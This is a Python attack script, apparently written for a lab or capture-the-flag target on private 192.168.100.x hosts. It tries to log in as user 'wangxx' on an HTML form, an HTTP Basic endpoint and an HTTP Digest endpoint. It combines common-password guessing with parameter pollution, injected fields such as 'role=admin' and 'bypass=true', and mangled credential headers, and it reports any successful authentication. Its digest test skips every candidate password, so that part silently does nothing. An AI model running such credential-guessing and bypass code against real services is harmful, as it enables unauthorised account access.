#!/usr/bin/env python3
"""
HTTP Parameter Pollution and Bypass Testing
Tests various parameter manipulation techniques across all web services
"""

import requests
import base64
import hashlib
import re
import time
import urllib.parse

class ParameterPollutionTester:
    def __init__(self):
        self.html_url = 'http://192.168.100.101/dologin.html'
        self.basic_url = 'http://192.168.100.103/basicauth'
        self.digest_url = 'http://192.168.100.103/digestauth'
        self.username = 'wangxx'
        
        # Test passwords based on previous analysis
        self.test_passwords = [
            'password', 'admin123', 'test1234', '12345678',
            'qwerty12', 'passw0rd', 'a1b2c3d4', '111111'
        ]
    
    def test_html_parameter_pollution(self):
        """Test HTTP parameter pollution on HTML form"""
        print("HTML Form Parameter Pollution Tests")
        print("-" * 40)
        
        results = []
        
        for password in self.test_passwords[:4]:  # Test subset
            tests = [
                # Standard request
                {'httpd_username': self.username, 'httpd_password': password},
                
                # Double password parameters
                {'httpd_username': self.username, 'httpd_password': ['wrong', password]},
                {'httpd_username': self.username, 'httpd_password': [password, 'wrong']},
                
                # Additional unexpected parameters
                {'httpd_username': self.username, 'httpd_password': password, 'admin': '1'},
                {'httpd_username': self.username, 'httpd_password': password, 'role': 'admin'},
                {'httpd_username': self.username, 'httpd_password': password, 'bypass': 'true'},
                {'httpd_username': self.username, 'httpd_password': password, 'auth': 'skip'},
                
                # Case variations
                {'HTTPD_USERNAME': self.username, 'HTTPD_PASSWORD': password},
                {'httpd_Username': self.username, 'httpd_Password': password},
                
                # URL encoding variations
                {'httpd_username': self.username, 'httpd_password': urllib.parse.quote(password)},
                
                # Hidden field manipulation
                {'httpd_username': self.username, 'httpd_password': password, 'redirect': '/admin'},
                {'httpd_username': self.username, 'httpd_password': password, 'action': 'login'},
                {'httpd_username': self.username, 'httpd_password': password, 'method': 'bypass'},
            ]
            
            print(f"\nTesting password: {password}")
            
            for i, data in enumerate(tests):
                try:
                    if isinstance(data.get('httpd_password'), list):
                        # Handle multiple password parameters manually
                        post_data = f"httpd_username={self.username}"
                        for pwd in data['httpd_password']:
                            post_data += f"&httpd_password={pwd}"
                        
                        response = requests.post(
                            self.html_url,
                            data=post_data,
                            headers={'Content-Type': 'application/x-www-form-urlencoded'},
                            timeout=5,
                            allow_redirects=False
                        )
                    else:
                        response = requests.post(
                            self.html_url,
                            data=data,
                            timeout=5,
                            allow_redirects=False
                        )
                    
                    location = response.headers.get('Location', '')
                    status = response.status_code
                    content_len = len(response.text)
                    
                    result = {
                        'test': i+1,
                        'data': str(data)[:100],
                        'status': status,
                        'location': location,
                        'content_len': content_len
                    }
                    
                    results.append(result)
                    
                    # Check for success indicators
                    if status == 200 or (status == 302 and location != 'http://192.168.100.101/login.html'):
                        print(f"  [TEST {i+1:2d}] POTENTIAL SUCCESS: Status {status}, Location: {location}")
                        print(f"            Data: {str(data)[:80]}...")
                    elif i % 3 == 0:  # Show every 3rd test for progress
                        print(f"  [TEST {i+1:2d}] Status: {status}, Loc: {location[:30]}...")
                    
                    time.sleep(0.2)  # Rate limiting
                    
                except Exception as e:
                    print(f"  [TEST {i+1:2d}] ERROR: {e}")
                    results.append({'test': i+1, 'error': str(e)})
        
        return results
    
    def test_basic_auth_manipulation(self):
        """Test HTTP Basic auth parameter manipulation"""
        print("\nHTTP Basic Auth Manipulation Tests")
        print("-" * 40)
        
        results = []
        
        for password in self.test_passwords[:3]:
            print(f"\nTesting password: {password}")
            
            tests = [
                # Standard auth
                base64.b64encode(f"{self.username}:{password}".encode()).decode(),
                
                # Case manipulation
                base64.b64encode(f"{self.username.upper()}:{password}".encode()).decode(),
                base64.b64encode(f"{self.username}:{password.upper()}".encode()).decode(),
                
                # Extra spaces/chars
                base64.b64encode(f" {self.username}:{password}".encode()).decode(),
                base64.b64encode(f"{self.username} :{password}".encode()).decode(),
                base64.b64encode(f"{self.username}: {password}".encode()).decode(),
                base64.b64encode(f"{self.username}:{password} ".encode()).decode(),
                
                # Different separators (unlikely but worth testing)
                base64.b64encode(f"{self.username};{password}".encode()).decode(),
                base64.b64encode(f"{self.username}|{password}".encode()).decode(),
            ]
            
            for i, auth_header in enumerate(tests):
                try:
                    response = requests.get(
                        self.basic_url,
                        headers={'Authorization': f'Basic {auth_header}'},
                        timeout=5
                    )
                    
                    result = {
                        'test': i+1,
                        'auth_header': auth_header[:50],
                        'status': response.status_code,
                        'content_len': len(response.text)
                    }
                    
                    results.append(result)
                    
                    if response.status_code == 200:
                        print(f"  [TEST {i+1:2d}] SUCCESS! Status: 200, Content: {len(response.text)} bytes")
                        print(f"            Auth: {auth_header[:50]}...")
                        return results  # Stop on first success
                    elif i % 2 == 0:
                        print(f"  [TEST {i+1:2d}] Status: {response.status_code}")
                    
                    time.sleep(0.2)
                    
                except Exception as e:
                    print(f"  [TEST {i+1:2d}] ERROR: {e}")
                    results.append({'test': i+1, 'error': str(e)})
        
        return results
    
    def test_digest_auth_manipulation(self):
        """Test HTTP Digest auth parameter manipulation"""
        print("\nHTTP Digest Auth Manipulation Tests")
        print("-" * 40)
        
        # Get challenge first
        try:
            response = requests.get(self.digest_url, timeout=5)
            if response.status_code != 401:
                print("Could not get digest challenge")
                return []
            
            auth_header = response.headers.get('WWW-Authenticate', '')
            if 'Digest' not in auth_header:
                print("No digest challenge found")
                return []
            
            # Parse challenge
            realm_match = re.search(r'realm="([^"]*)"', auth_header)
            nonce_match = re.search(r'nonce="([^"]*)"', auth_header)
            
            if not realm_match or not nonce_match:
                print("Could not parse digest challenge")
                return []
            
            realm = realm_match.group(1)
            nonce = nonce_match.group(1)
            
        except Exception as e:
            print(f"Error getting digest challenge: {e}")
            return []
        
        results = []
        
        for password in self.test_passwords[:3]:
            if len(password) != 6 or not password.replace('-', '').replace('_', '').isalnum():
                continue
                
            print(f"\nTesting password: {password}")
            
            # Create standard digest response
            ha1 = hashlib.md5(f"{self.username}:{realm}:{password}".encode()).hexdigest()
            ha2 = hashlib.md5(f"GET:/digestauth".encode()).hexdigest()
            response_hash = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
            
            tests = [
                # Standard digest
                (f'Digest username="{self.username}", realm="{realm}", '
                 f'nonce="{nonce}", uri="/digestauth", response="{response_hash}"'),
                
                # Case variations
                (f'digest username="{self.username}", realm="{realm}", '
                 f'nonce="{nonce}", uri="/digestauth", response="{response_hash}"'),
                
                # Parameter order changes
                (f'Digest realm="{realm}", username="{self.username}", '
                 f'response="{response_hash}", nonce="{nonce}", uri="/digestauth"'),
                
                # Extra parameters
                (f'Digest username="{self.username}", realm="{realm}", '
                 f'nonce="{nonce}", uri="/digestauth", response="{response_hash}", '
                 f'opaque="test", algorithm=MD5'),
                
                # Space variations
                (f'Digest  username="{self.username}",  realm="{realm}", '
                 f'nonce="{nonce}",  uri="/digestauth",  response="{response_hash}"'),
            ]
            
            for i, digest_header in enumerate(tests):
                try:
                    response = requests.get(
                        self.digest_url,
                        headers={'Authorization': digest_header},
                        timeout=5
                    )
                    
                    result = {
                        'test': i+1,
                        'header': digest_header[:100],
                        'status': response.status_code,
                        'content_len': len(response.text)
                    }
                    
                    results.append(result)
                    
                    if response.status_code == 200:
                        print(f"  [TEST {i+1:2d}] SUCCESS! Status: 200, Content: {len(response.text)} bytes")
                        print(f"            Header: {digest_header[:80]}...")
                        return results
                    elif i % 2 == 0:
                        print(f"  [TEST {i+1:2d}] Status: {response.status_code}")
                    
                    time.sleep(0.2)
                    
                except Exception as e:
                    print(f"  [TEST {i+1:2d}] ERROR: {e}")
                    results.append({'test': i+1, 'error': str(e)})
        
        return results
    
    def run_all_tests(self):
        """Run all parameter pollution tests"""
        print("HTTP Parameter Pollution and Bypass Testing")
        print("=" * 50)
        
        all_results = {}
        
        # Test HTML form
        all_results['html'] = self.test_html_parameter_pollution()
        
        # Test Basic auth
        all_results['basic'] = self.test_basic_auth_manipulation()
        
        # Test Digest auth
        all_results['digest'] = self.test_digest_auth_manipulation()
        
        print("\n" + "=" * 50)
        print("PARAMETER POLLUTION TESTING COMPLETE")
        print("=" * 50)
        
        # Summary
        total_tests = sum(len(results) for results in all_results.values())
        print(f"Total tests conducted: {total_tests}")
        
        # Look for successes
        successes = []
        for service, results in all_results.items():
            for result in results:
                if isinstance(result, dict):
                    if (result.get('status') == 200 or 
                        (service == 'html' and result.get('status') == 302 and 
                         result.get('location') != 'http://192.168.100.101/login.html')):
                        successes.append((service, result))
        
        if successes:
            print("\nSUCCESSFUL AUTHENTICATIONS FOUND:")
            for service, result in successes:
                print(f"{service.upper()}: {result}")
        else:
            print("\nNo successful authentications found through parameter manipulation.")
        
        return all_results

if __name__ == "__main__":
    tester = ParameterPollutionTester()
    results = tester.run_all_tests()